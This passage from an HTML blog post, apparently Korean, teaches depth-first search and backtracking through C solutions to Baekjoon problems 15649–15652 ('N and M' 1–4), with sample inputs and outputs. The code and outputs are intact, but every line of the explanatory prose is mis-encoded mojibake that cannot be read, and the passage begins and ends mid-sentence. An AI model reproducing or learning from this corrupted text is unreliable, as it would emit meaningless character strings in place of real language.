ÏÉùÍ∞ÅÌïòÎ©¥ Ïù¥Í≤å Î¨¥ÏóáÏù∏ÏßÄÎäî Î∞îÎ°ú Ïù¥Ìï¥Í∞Ä Îê† Í≤ÉÏù¥Îã§.</p><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><p>DFS(Depth - First - Search)Îäî ÍπäÏù¥ Ïö∞ÏÑ† ÌÉêÏÉâÏùÑ ÏùòÎØ∏ÌïúÎã§. Ïñ¥Îñ†Ìïú ÎÇ¥Ïö©ÏùÑ Î∏åÎ£®Ìä∏ Ìè¨Ïã±Ìï† Îïå Ï†úÏùº ÍπäÏù¥ ÎÇ¥Î†§Í∞ÄÏÑú ÏïÑÎûòÎã®Î∂ÄÌÑ∞ ÌÉêÏÉâÌïòÎäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. ÏïÑÎûò gifÎ•º Î≥¥Î©¥ Ïûò Ïù¥Ìï¥Í∞Ä Îê† Í≤ÉÏù¥Îã§. </p><img src="/images/230202-algorithm-dfs_backtracking/Depth-First-Search.gif" width=350/><br>DFSÎäî Ï£ºÎ°ú Í∑∏ÎûòÌîÑÎÇò Ìä∏Î¶¨ÏôÄ Ïó∞Í¥ÄÎêòÏñ¥ ÏÇ¨Ïö©ÎêúÎã§Í≥† ÌïúÎã§. ÏΩîÎìúÎäî ÏïÑÎûò Î∞±Ìä∏ÎûòÌÇπ ÏÑ§Î™ÖÏóêÏÑú ÌïúÍ∫ºÎ≤àÏóê ÏÇ¥Ìé¥Î≥¥Ïûê.<p>DFSÎäî Ï°∞Í±¥ ÏÉÅÍ¥ÄÏóÜÏù¥ Î™®Îì† Í≤ÉÏùÑ ÌÉêÏÉâÌï¥Ïïº ÌïúÎã§. <code>Î∞±Ï§Ä 15649 NÍ≥º M (1)</code> Î≥¥Îã§ <code>Î∞±Ï§Ä 15651 NÍ≥º M (3)</code> Î∂ÄÌÑ∞ ÌíÄÏù¥Î•º ÏßÑÌñâÌïòÎäî Í≤ÉÏù¥ Î∞±Ìä∏ÎûòÌÇπ Ïù¥Ìï¥Ïóê Îçî ÎèÑÏõÄÏù¥ Îê† ÎìØ ÌïòÎã§. (Ïä§Ìè¨ÏßÄÎßå (3)ÏùÄ Î∞±Ìä∏ÎûòÌÇπ Í∞úÎÖê ÏóÜÏù¥ DFSÎßåÏùÑ Í∞ÄÏßÄÍ≥† ÌíÄÏù¥Ìï† Ïàò ÏûàÎã§.)</p><ul><li><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></li></ul><h2 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h2><p>ÏúÑÏùò DFSÏóêÏÑú Î¥§Îçò Ìä∏Î¶¨Î•º Ïû†Íπê ÏÉÅÏÉÅÌï¥Î≥¥Ïûê. Ï†ïÎãµÏùÑ Ï∞æÍ∏∞ÏúÑÌï¥ Î∂ÄÎ™® ÎÖ∏ÎìúÏóêÏÑú ÏûêÏãù ÎÖ∏ÎìúÍπåÏßÄ ÎÇ¥Î†§Í∞ÑÎã§. Ïù¥Îïå Ïñ¥Îñ†Ìïú Ï°∞Í±¥Ïóê Î∂ÄÌï©ÌïòÎäî Í≤ΩÏö∞Îßå ÏûêÏãù ÎÖ∏ÎìúÎ°ú ÎÇ¥Î†§Í∞ÄÍ≥† Í∑∏Î†áÏßÄ ÏïäÎã§Î©¥ Îã§Ïãú Î∂ÄÎ™® ÎÖ∏ÎìúÎ°ú Ïò¨ÎùºÍ∞ÑÎã§. Ïù¥Îü¨Ìïú <code>Ï°∞Í±¥Ïóê Î∂ÄÌï©ÌïúÎã§.</code>Î•º <strong><code>Ïú†ÎßùÌïòÎã§.</code></strong> ÎùºÍ≥† ÌëúÌòÑÌïúÎã§. Ï°∞Í±¥Ïóê Î∂ÄÌï©ÌïòÏßÄ ÏïäÏùÄ, Ï¶â Ïú†ÎßùÌïòÏßÄ ÏïäÏùÄ ÎÖ∏ÎìúÎäî ÌôïÏù∏ÏùÑ ÏïàÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÌíÄÏù¥ ÏãúÍ∞ÑÏùÑ Îã®Ï∂ïÌï† Ïàò ÏûàÎã§. </p><p>Ìä∏Î¶¨Î°ú ÏòàÏãúÎ•º Îì§ÏóàÏßÄÎßå ÏÇ¨Ïã§ Íµ¨ÌòÑÏùÄ ÌÅêÎÇò Ïû¨Í∑ÄÌï®ÏàòÎ°ú ÎßéÏù¥ ÌïúÎã§Í≥† ÌïúÎã§. Ïù¥ Í∏ÄÏóêÏÑ† Ïû¨Í∑ÄÌï®ÏàòÎ°ú Î¨∏Ï†úÎ•º ÌíÄÏù¥ÌïòÎèÑÎ°ù ÌïúÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Ï†ïÎãµÏù¥ÎùºÎ©¥) &#123;</span><br><span class="line">        Ï†ïÎãµ Ï∂úÎ†• ÌõÑ Ï¢ÖÎ£å</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//Ï†ïÎãµÏù¥ ÏïÑÎãàÎùºÎ©¥</span></span><br><span class="line">        <span class="keyword">for</span> (Î™®Îì† ÏûêÏãù ÎÖ∏ÎìúÏóê ÎåÄÌï¥ÏÑú) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Ï†ïÎãµÏóê Ïú†ÎßùÌïòÎã§Î©¥) &#123;</span><br><span class="line">                ÏûêÏãù ÎÖ∏ÎìúÎ°ú Ïù¥Îèô</span><br><span class="line">                DFS(depth + <span class="number">1</span>);</span><br><span class="line">                Î∂ÄÎ™® ÎÖ∏ÎìúÎ°ú Ïù¥Îèô</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïû¨Í∑Ä Ìï®Ïàò Î∞ëÏóê ÎÇòÏò§Îäî Î¨∏Ïû•ÏùÄ Ïñ¥ÎñªÍ≤å Ïù¥Ìï¥Ìï¥Ïïº Ìï†Íπå?<br>Ï†ïÎãµÏóê Ïú†ÎßùÌïòÎã§Î©¥ ÏûêÏãù ÎÖ∏ÎìúÎ•º ÏùºÎã® ÏÑ†ÌÉùÌïú Îí§Ïóê, Í∑∏Í±∏ ÏÑ†ÌÉùÌïú ÌõÑ Ìï¥Í≤∞Ìïú Îí§Ïóê, Îã§Ïãú ÏõêÎûòÏùò ÏÉÅÌÉúÎ°ú ÎêòÎèåÎ¶∞Îã§.(Î∂ÄÎ™® ÎÖ∏ÎìúÎ°ú Ïù¥Îèô) </p><h2 id="Î∞±Ï§Ä-15649-NÍ≥º-M-1"><a href="#Î∞±Ï§Ä-15649-NÍ≥º-M-1" class="headerlink" title="Î∞±Ï§Ä 15649 NÍ≥º M (1)"></a>Î∞±Ï§Ä 15649 NÍ≥º M (1)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15649">https://www.acmicpc.net/problem/15649</a></p></li><li><p>1Î∂ÄÌÑ∞ NÍπåÏßÄ ÏûêÏó∞Ïàò Ï§ëÏóêÏÑú <strong>Ï§ëÎ≥µ ÏóÜÏù¥</strong> MÍ∞úÎ•º Í≥†Î•∏ ÏàòÏó¥. Ìïú ÎßàÎîîÎ°ú <code>nPm</code>ÏùÑ Íµ¨ÌïòÎäî Î¨∏Ï†ú.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br></pre></td></tr></table></figure></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span>) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï§ëÎ≥µÏùÑ ÏúÑÌï¥ ÏÇ¨Ïö©Ìïú <code>visit</code> Î∞∞Ïó¥ÏùÄ <code>Í∞í</code>Ïù¥ ÏÇ¨Ïö©ÌñàÎÇò ÏïàÌñàÎÇòÎ•º ÌåêÎã®ÌïòÎäî Î∞∞Ïó¥Ïù¥Îã§. (<code>Í∞í</code>ÏùÑ Ïù∏Îç±Ïä§Î°ú ÌôúÏö©ÌïúÎã§.) ÏûÖÎ†•Ïù¥ 1Î∂ÄÌÑ∞ ÏãúÏûëÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>visit</code> Î∞∞Ïó¥ Ïù∏Îç±Ïä§Î•º 1Î∂ÄÌÑ∞ ÏÇ¨Ïö©ÌïúÎã§. ÏßÄÍ∏à ÏÉùÍ∞ÅÌï¥Î≥¥Î©¥ checkÏùò ÎÑ§Ïù¥Î∞çÏù¥ Ï¢Ä Îçî Ïñ¥Ïö∏Î¶¨Îäî Í≤É Í∞ôÍ∏∞ÎèÑ ÌïòÎã§. Í∞ÄÎèÖÏÑ±ÏùÑ ÏúÑÌïòÏó¨ bool ÌÉÄÏûÖÏúºÎ°ú ÏßÄÏ†ïÌïòÏòÄÎã§. falseÎùºÎ©¥ ÏÇ¨Ïö©ÏùÑ ÌïòÏßÄ ÏïäÏïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>data</code> Î∞∞Ïó¥Ïóê Í∞íÏùÑ ÎÑ£Ïñ¥Ï£ºÍ≥† Ìï¥Îãπ Í∞íÏùÑ Ïù∏Îç±Ïä§Î°ú Í∞ÄÏßÄÎäî <code>visit</code> Î∞∞Ïó¥ÏùÑ trueÎ°ú ÏÑ∏ÌåÖÌïúÎã§. Í∑∏Î¶¨Í≥† Í∑∏ Îã§Ïùå ÏûêÏãù ÎÖ∏ÎìúÎ•º ÌÉêÏÉâÌïúÎã§. </p><p>ÎßåÏïΩ Ïú†ÎßùÌïòÏßÄ ÏïäÎã§Î©¥ <code>i++</code>Î°ú Îã§Ïùå Î∞òÎ≥µÎ¨∏ÏùÑ ÎèàÎã§. </p><p>depthÍ∞Ä mÍ≥º Í∞ôÏùÑ Í≤ΩÏö∞Ïóî Ìä∏Î¶¨ ÎÅùÍπåÏßÄ Îã§ ÎÇ¥Î†§Í∞îÍ∏∞ ÎïåÎ¨∏Ïóê <code>data</code> Î∞∞Ïó¥Ïù¥ Ï∂úÎ†•ÎêúÎã§. ÏûäÏúºÎ©¥ ÏïàÎêòÎäî Í≤ÉÏù¥ mÏù¥ Ï∂úÎ†•Ìï¥ÏïºÌï† Ïà´Ïûê ÏàòÏù¥Îã§. Ïñ¥Ï©åÎ©¥ Ïù¥ Ï°∞Í±¥ÏùÄ ÎãπÏó∞Ìïú Í≤ÉÏùºÏßÄÎèÑ Î™®Î•∏Îã§. Ìó∑Í∞àÎ¶¨ÏßÄ ÎßêÏûê. </p><p>Ïù¥ Î¨∏Ï†úÎ•º Ïù¥Ìï¥ÌïòÎ©¥ Îã§Ïùå 2, 3, 4Îäî Îß§Ïö∞ ÏâΩÍ≤å ÌíÄÏù¥Ìï† Ïàò ÏûàÎã§. ÎÇ¥Í∞Ä Í∑∏Îû¨Îã§.</p><h2 id="Î∞±Ï§Ä-15650-NÍ≥º-M-2"><a href="#Î∞±Ï§Ä-15650-NÍ≥º-M-2" class="headerlink" title="Î∞±Ï§Ä 15650 NÍ≥º M (2)"></a>Î∞±Ï§Ä 15650 NÍ≥º M (2)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15650">https://www.acmicpc.net/problem/15650</a></p></li><li><p>1Î∂ÄÌÑ∞ NÍπåÏßÄ ÏûêÏó∞Ïàò Ï§ëÏóêÏÑú Ï§ëÎ≥µ ÏóÜÏù¥ MÍ∞úÎ•º Í≥†Î•∏ ÏàòÏó¥. Ï∂îÍ∞ÄÎ°ú <strong>Ïò§Î¶ÑÏ∞®Ïàú</strong>Ïù¥Ïñ¥Ïïº Ìï®.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure></li><li><p>Ïù¥ Ï†Ñ Î¨∏Ï†úÏôÄ Îã§Î•¥Í≤å Ïò§Î¶ÑÏ∞®ÏàúÏù¥ ÏïÑÎãå Í≤ΩÏö∞Î©¥ Ï∂úÎ†•ÏùÑ ÌïòÏßÄ ÏïäÎäîÎã§.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span> &amp;&amp; pre &lt; i) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥ Ï†Ñ ÏΩîÎìúÏóêÏÑú <code>pre &lt; i</code> Ï°∞Í±¥ÏùÑ Ï∂îÍ∞ÄÌï¥Ï£ºÏóàÎã§. Ïù¥Îïå Ï£ºÏùòÌï¥ÏïºÌï† Ï†êÏùÄ preÍ∞Ä Îì±Ïû•ÌñàÍ∏∞ ÎïåÎ¨∏Ïóê main Ìï®ÏàòÏóêÏÑú depth 1Î∂ÄÌÑ∞ ÌÉêÏÉâÌïúÎã§. Ï¶â data Î∞∞Ïó¥ÏùÑ Ïù∏Îç±Ïä§ 1Î∂ÄÌÑ∞ ÏÇ¨Ïö©ÌïúÎã§. Í∑∏ÎûòÏÑú Ï∂úÎ†•Ìï† Îïå <code>for (int i = 1; i &lt;= m; i++)</code> Ï°∞Í±¥ÏúºÎ°ú Ìï¥ÏïºÌïúÎã§.</p><h2 id="Î∞±Ï§Ä-15651-NÍ≥º-M-3"><a href="#Î∞±Ï§Ä-15651-NÍ≥º-M-3" class="headerlink" title="Î∞±Ï§Ä 15651 NÍ≥º M (3)"></a>Î∞±Ï§Ä 15651 NÍ≥º M (3)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></p></li><li><p>1Î∂ÄÌÑ∞ NÍπåÏßÄ ÏûêÏó∞Ïàò Ï§ëÏóêÏÑú MÍ∞úÎ•º Í≥†Î•∏ ÏàòÏó¥. <strong>Ï§ëÎ≥µ ÌóàÏö©</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p><code>NÍ≥º M (1)</code> Î¨∏Ï†úÏôÄ ÎπÑÍµêÌï¥ÏÑú Ï§ëÎ≥µÏù¥ ÌóàÏö©ÎêòÏóàÎã§. ÏÇ¨Ïã§ÏÉÅ Ïù¥ Î¨∏Ï†úÍ∞Ä Íµ¨ÌòÑÌïòÍ∏∞ Í∞ÄÏû• Ïâ¨Ïö∏ Í≤É Í∞ôÎã§.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            data[depth] = i;</span><br><span class="line">            DFS(depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï°∞Í±¥ ÏóÜÏù¥ Î™®Îì† Í≤ÉÏùÑ Îã§ ÏôÑÏ†ÑÌûà ÌÉêÏÉâÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Î∞±Ìä∏ÎûòÌÇπ ÏïåÍ≥†Î¶¨Ï¶òÏùÄ ÏÇ¨Ïö©ÎêòÏßÄ ÏïäÏïòÎã§. DFSÎ°ú ÏôÑÏ†ÑÌÉêÏÉâÌïúÎã§.</p><h2 id="Î∞±Ï§Ä-15652-NÍ≥º-M-4"><a href="#Î∞±Ï§Ä-15652-NÍ≥º-M-4" class="headerlink" title="Î∞±Ï§Ä 15652 NÍ≥º M (4)"></a>Î∞±Ï§Ä 15652 NÍ≥º M (4)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15652">https://www.acmicpc.net/problem/15652</a></p></li><li><p>1Î∂ÄÌÑ∞ NÍπåÏßÄ ÏûêÏó∞Ïàò Ï§ëÏóêÏÑú MÍ∞úÎ•º Í≥†Î•∏ ÏàòÏó¥. Ï§ëÎ≥µ ÌóàÏö©. <strong>ÎπÑÎÇ¥Î¶ºÏ∞®Ïàú</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p>Í∏∏Ïù¥Í∞Ä KÏù∏ ÏàòÏó¥ AÍ∞Ä A1 ‚â§ A2 ‚â§ ‚Ä¶ ‚â§ AK-1 ‚â§ AKÎ•º ÎßåÏ°±ÌïòÎ©¥, ÎπÑÎÇ¥Î¶ºÏ∞®ÏàúÏù¥ÎùºÍ≥† ÌïúÎã§.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pre &lt;= i) &#123; <span class="comment">// ÎπÑÎÇ¥Î¶ºÏ∞®Ïàú</span></span><br><span class="line">                data[depth] = i;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">   DFS(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NÍ≥º M (2)ÏóêÏÑú Ïò§Î¶ÑÏ∞®ÏàúÏùÑ Íµ¨ÌòÑÌñàÎã§Î©¥ ÏâΩÍ≤å Ïú†ÎßùÌïú Ï°∞Í±¥Ïóê ÎπÑÎÇ¥Î¶ºÏ∞®ÏàúÏùÑ 